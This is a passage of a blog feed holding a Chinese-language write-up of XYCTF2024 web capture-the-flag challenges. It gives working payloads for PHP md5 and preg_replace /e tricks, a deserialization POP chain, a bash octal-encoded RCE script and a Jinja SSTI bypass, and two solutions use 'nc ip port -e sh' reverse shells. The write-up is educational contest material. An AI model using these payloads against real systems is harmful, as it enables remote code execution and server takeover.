class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF2024</title>
    <link href="/2024/04/09/XYCTF2024/"/>
    <url>/2024/04/09/XYCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h1><p>打开是登录页面，先看源码，源码提示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 为了防止忘记密码，我把它们放在某个地方了 --&gt;</span><br></code></pre></td></tr></table></figure><p>第一反应是robots.txt，进去看看。</p><p><img src="/img/XYCTF2024/image-20240409194805433.png" alt="image-20240409194805433"></p><p>得到&#x2F;l0g1n.txt，进入得到帐号密码：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> XYCTF<br><span class="hljs-symbol">password:</span> @JOILha!wuigqi123$<br></code></pre></td></tr></table></figure><p>登录后，开始正常修改http请求头，先抓个包，</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">提示：不是 yuanshen.<span class="hljs-keyword">com</span> 来的我不要<br><br>修改：Referer: yuanshen.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">你用的不是XYCTF的浏览器<br><br><span class="hljs-keyword">User</span>-Agent: XYCTF<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">非本地用户禁止访问！<br><br>x-forwarded-for:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">xff</span> 打咩！！！<br><br>把x-forwarded-for:<span class="hljs-number">127.0.0.1</span>改成Client-ip:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">不是从 ymzx.qq.<span class="hljs-keyword">com</span> 代理来的我不玩<br><br><span class="hljs-keyword">vi</span><span class="hljs-variable">a:ymzx</span>.qq.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">有点饿，想吃点XYCTF的小饼干<br><br><span class="hljs-symbol">Cookie:</span>XYCTF<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">恭喜你拿到flag！<br>XYCTF&#123;fefa6df3<span class="hljs-string">-4</span>e5e<span class="hljs-string">-459</span>c<span class="hljs-string">-8966</span><span class="hljs-string">-1</span>dfad17cced4&#125;<br></code></pre></td></tr></table></figure><p>最终http包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:46497<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>XYCTF<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>48<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>yuanshen.com<br>Client-ip:127.0.0.1<br>via:ymzx.qq.com<br>Cookie:XYCTF<br><br><span class="language-apache"><span class="hljs-attribute">username</span>=XYCTF&amp;password=%<span class="hljs-number">40</span>JOILha%<span class="hljs-number">21</span>wuigqi123%<span class="hljs-number">24</span></span><br></code></pre></td></tr></table></figure><h1 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h1><p>第一层是md5弱比较</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">val1</span>=QNKCDZO&amp;val2=QLTHNDT<br></code></pre></td></tr></table></figure><p>第二层$md5 &#x3D;&#x3D; md5($md5)</p><p>所以就是找<strong>自身和md5加密后都是0e开头</strong>，且后面都是纯数字的字符串</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">md5</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>e215962017<br></code></pre></td></tr></table></figure><p>第三层首先要过$XY &#x3D;&#x3D; $XYCTF</p><p>$XYCTF &#x3D; “Warm up”;给定了，但是有个extract($_GET);可以变量覆盖。所以我们只需要给XY和XYCTF传相同的值即可。然后要过md5弱比较</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$XY</span> != <span class="hljs-string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$XY</span>) == <span class="hljs-built_in">md5</span>(<span class="hljs-string">&quot;XYCTF_550102591&quot;</span>)<br></code></pre></td></tr></table></figure><p>经过查询，发现md5(“XYCTF_550102591”)是0e开头的字符串，那么直接老样子绕过即可</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">XY</span>=QLTHNDT&amp;XYCTF=QLTHNDT<br></code></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">val1=QNKCDZO<span class="hljs-variable">&amp;val2</span>=QLTHNDT<span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;</span>XY=QLTHNDT<span class="hljs-variable">&amp;</span>XYCTF=QLTHNDT<br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><p>下一关：LLeeevvveeelll222.php</p><p>首先要过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">!<span class="hljs-built_in">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>, $_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;a&#x27;</span>]</span>) &amp;&amp; <span class="hljs-built_in">intval</span>($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;a&#x27;</span>]</span>)<br></code></pre></td></tr></table></figure><p>a不能是数字，但是intval会返回1,了解intval函数特性可以知道：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">成功时返回 var 的 integer 值，失败时返回 0。 空的<span class="hljs-built_in"> array </span>返回 0，非空的<span class="hljs-built_in"> array </span>返回 1。<br></code></pre></td></tr></table></figure><p>那么传<strong>a[]&#x3D;a</strong></p><p>下一步执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> preg_replace(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这里是preg_replace在&#x2F;e模式下可以任意命令执行的特性。</p><p>补充一下preg_replace的用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;Visit Microsoft!&#x27;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/microsoft/i&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-string">&#x27;W3Schools&#x27;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br>输出：Visit W3Schools! <br></code></pre></td></tr></table></figure><p><strong>preg_replace &#x2F;e 模式下的代码执行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/test/e&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>],<span class="hljs-string">&quot;jutst test&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>第二个参数所代表的的内容将被执行<br></code></pre></td></tr></table></figure><p>答案很明了了</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">GET：a=<span class="hljs-keyword">/test/</span>e<span class="hljs-variable">&amp;b</span>=system(<span class="hljs-string">&quot;cat%20/flag&quot;</span>)<span class="hljs-variable">&amp;c</span>=test<br><br>POST：a[]=a<br></code></pre></td></tr></table></figure><p><img src="/img/XYCTF2024/image-20240409201508344.png" alt="image-20240409201508344"></p><h1 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h1><p>让我们上传图片并比较，结合题目名可以猜测应该是比较两个图片的md5值是否相同，用fastcoll工具生成两个相同的图片，然后上传即可。</p><h1 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h1><p>很若至的非预期，出题人居然这个也能忘关flag路由，访问即送flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:39701/flag<br></code></pre></td></tr></table></figure><p>正常做法是makefile读取文件内容，在Makefile中，你可以使用$(shell)函数来读取文件内容。</p><p>假设你的文件名为file.txt，你可以使用以下命令来读取文件内容：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">content := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> cat <span class="hljs-built_in">file</span>.txt)</span><br></code></pre></td></tr></table></figure><p>上述命令将文件file.txt的内容存储在变量content中。你可以根据需要将其用于后续的操作。</p><p>如果你需要按行读取文件内容，可以使用$(shell)函数和foreach函数的结合：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">lines := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> cat <span class="hljs-built_in">file</span>.txt)</span> <span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> line,<span class="hljs-variable">$(lines)</span>, \ $(info <span class="hljs-variable">$(line)</span>)</span> \ )<br></code></pre></td></tr></table></figure><p>把file.txt改成flag即可。</p><p><img src="/img/XYCTF2024/image-20240409202223072.png" alt="image-20240409202223072"></p><h1 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h1><p>fuzz一下，过滤了较多命令，但是nc未过滤，直接连服务器。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> <span class="hljs-built_in">ip</span> port  -e sh<br></code></pre></td></tr></table></figure><p><img src="/img/XYCTF2024/image-20240409202500308.png" alt="image-20240409202500308"></p><h1 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h1><p>过滤了很多命令，但反引号没过滤，可以用反引号当shell_exec()函数执行命令。</p><p>eval前面和后面都有脏数据，最简单的办法是换行和注释绕过。分别在最前和最后加上%0a、%23</p><p>这道题没过滤nc，所以照样可以让这边连我们的服务器。</p><p>因为cmd有长度限制，所以我们可以用$_GET[1]传递参数。</p><p>记得eval中的命令都必须要加分号。</p><p>最终payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=%0a`$_GET[1]`;%23&amp;<span class="hljs-attribute">1</span>=nc<span class="hljs-built_in"> ip port </span> -e sh<br></code></pre></td></tr></table></figure><h1 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h1><p>链子很简单，这里不再赘述：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">CCC-&gt; <span class="hljs-function"><span class="hljs-title">echo</span> $this-&gt;</span><span class="hljs-function"><span class="hljs-title">c</span>;       触发AAA-&gt;</span>__toString()<br>AAA-&gt;<span class="hljs-function"><span class="hljs-title">return</span> $this-&gt;</span><span class="hljs-function"><span class="hljs-title">s</span>-&gt;</span>$<span class="hljs-function"><span class="hljs-title">p</span>;     触发BBB-&gt;</span>__get($<span class="hljs-keyword">name</span>)<br>BBB<br></code></pre></td></tr></table></figure><p>链子的起点是__destruct() ，而代码中有throw new Exception(“noooooob!!!”); </p><p>这里需要Fast__destruct()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;i:1&quot;</span>,<span class="hljs-string">&quot;i:0&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><p>我们主要看BBB-&gt;__get() 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>;                <span class="hljs-comment">//注意这里b是一个整个post数组</span><br><span class="hljs-variable">$c</span>=<span class="hljs-variable language_">$this</span>-&gt;c;<br><span class="hljs-variable">$d</span>=<span class="hljs-variable language_">$this</span>-&gt;d;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);             <span class="hljs-comment">//这里删除了b数组里我们传入的a的值。</span><br>&#125;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>)(<span class="hljs-variable">$c</span>)(<span class="hljs-variable">$d</span>); <br></code></pre></td></tr></table></figure><p>这里直接给答案再分析。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST：<span class="hljs-attribute">a</span>=array_pop&amp;2[]=array_pop<br><span class="hljs-attribute">c</span>=array(&quot;system&quot;);<br><span class="hljs-attribute">d</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>array_pop() 函数删除数组中的最后一个元素。并返回最后一个元素。</strong></p><p>第一步变成了：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">array_pop(<span class="hljs-name">array</span>(<span class="hljs-string">&quot;array_pop&quot;</span>))(<span class="hljs-name">array</span>(<span class="hljs-string">&quot;system&quot;</span>))(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><p>第二步变成了：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">array_pop</span>(<span class="hljs-title">array</span>(<span class="hljs-string">&quot;system&quot;</span>))(<span class="hljs-string">&quot;cat /flag&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>第三步变成了：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>最终生成payload的php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CCC</span>();<br><span class="hljs-variable">$a</span>-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>();<br><span class="hljs-variable">$a</span>-&gt;c-&gt;s = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;i:1&quot;</span>,<span class="hljs-string">&quot;i:0&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>：?xy=a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;CCC&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;AAA&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;BBB&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;d&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;N;&#125;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br><span class="hljs-attribute">POST</span>：a=array_pop&amp;<span class="hljs-number">2</span>[]=array_pop<br></code></pre></td></tr></table></figure><h1 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h1><p>安洵杯2020 Web-Bash-Vino0o0o原题削弱版本。</p><p><a href="https://xz.aliyun.com/t/8581?time__1311=n4+xuDgDBDyDRnzD/D0YoQ+q7uI6aCiteD&alichlgref=https://cn.bing.com/#toc-3">https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0YoQ%2Bq7uI6aCiteD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-3</a></p><p>修改一下官方wp里的脚本。</p><p>安洵杯2020 Web-Bash-Vino0o0o这个题数字需要自己构造，但是这里直接给了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-built_in">dict</span>()<br>n[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;0&#x27;</span><br>n[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;1&#x27;</span><br>n[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;2&#x27;</span><br>n[<span class="hljs-number">3</span>] = <span class="hljs-string">&#x27;3&#x27;</span><br>n[<span class="hljs-number">4</span>] = <span class="hljs-string">&#x27;4&#x27;</span><br>n[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27;5&#x27;</span><br>n[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;6&#x27;</span><br>n[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27;7&#x27;</span><br><br>f=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str_to_oct</span>(<span class="hljs-params">cmd</span>):                                <span class="hljs-comment">#命令转换成八进制字符串</span><br>    s = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> cmd:<br>        o = (<span class="hljs-string">&#x27;%s&#x27;</span> % (<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(t))))[<span class="hljs-number">2</span>:]<br>        s+=<span class="hljs-string">&#x27;\\&#x27;</span>+o<br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build</span>(<span class="hljs-params">cmd</span>):                                     <span class="hljs-comment">#八进制字符串转换成字符</span><br>    payload = <span class="hljs-string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span><br>    s = str_to_oct(cmd).split(<span class="hljs-string">&#x27;\\&#x27;</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> s[<span class="hljs-number">1</span>:]:<br>        payload+=<span class="hljs-string">&quot;\\\\&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> _:<br>            payload+=n[<span class="hljs-built_in">int</span>(i)]<br>    <span class="hljs-keyword">return</span> payload+<span class="hljs-string">&#x27;\\\&#x27;&#x27;</span><br><br>payload=<span class="hljs-string">&quot;cat /f*&quot;</span><br><span class="hljs-built_in">print</span>(build(payload))<br></code></pre></td></tr></table></figure><p>打入payload一把嗦。</p><h1 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h1><p>这个题原来的题目描述可没有”说英语”这三个字，真的谜语题了哈。</p><p>登录页面弱口令：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>asdqwe<br></code></pre></td></tr></table></figure><p>ssti，过滤了大括号，但是汉字就是大括号。</p><p><img src="/img/XYCTF2024/image-20240409211715845.png" alt="image-20240409211715845"></p><p>过滤了很多东西。中括号，下划线，关键函数等，这些都可以用request.args绕过</p><p>其他就是很平常的ssti注入，这里不再赘述。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?sentence=哈()<span class="hljs-title">|attr(request.args.x1)|</span><span class="hljs-meta">attr</span>(request.args.x2)<span class="hljs-title">|attr(request.args.x3)()|</span><span class="hljs-meta">attr</span>(request.args.x4)(<span class="hljs-number">221</span>)<span class="hljs-title">|attr(request.args.x5)|</span><span class="hljs-meta">attr</span>(request.args.x6)<span class="hljs-title">|attr(request.args.x4)(request.args.x7)|</span><span class="hljs-meta">attr</span>(request.args.x4)(request.args.x8)(request.args.x9)哈&amp;<span class="hljs-built_in">x1</span><span class="hljs-symbol">=__class__</span>&amp;<span class="hljs-built_in">x2</span><span class="hljs-symbol">=__base__</span>&amp;<span class="hljs-built_in">x3</span><span class="hljs-symbol">=__subclasses__</span>&amp;<span class="hljs-built_in">x4</span><span class="hljs-symbol">=__getitem__</span>&amp;<span class="hljs-built_in">x5</span><span class="hljs-symbol">=__init__</span>&amp;<span class="hljs-built_in">x6</span><span class="hljs-symbol">=__globals__</span>&amp;<span class="hljs-built_in">x7</span><span class="hljs-symbol">=__builtins__</span>&amp;<span class="hljs-built_in">x8</span><span class="hljs-symbol">=eval</span>&amp;<span class="hljs-built_in">x9</span><span class="hljs-symbol">=__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat%20/flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p><img src="/img/XYCTF2024/image-20240409212001772.png" alt="image-20240409212001772"></p><h1 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h1><p>第一层需要$this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;password; </p><p>但是这里的token是token&#x3D;md5(mt_rand()); </p><p>这里可以用同地址变量绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;password = &amp;<span class="hljs-variable">$a</span>-&gt;token;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span 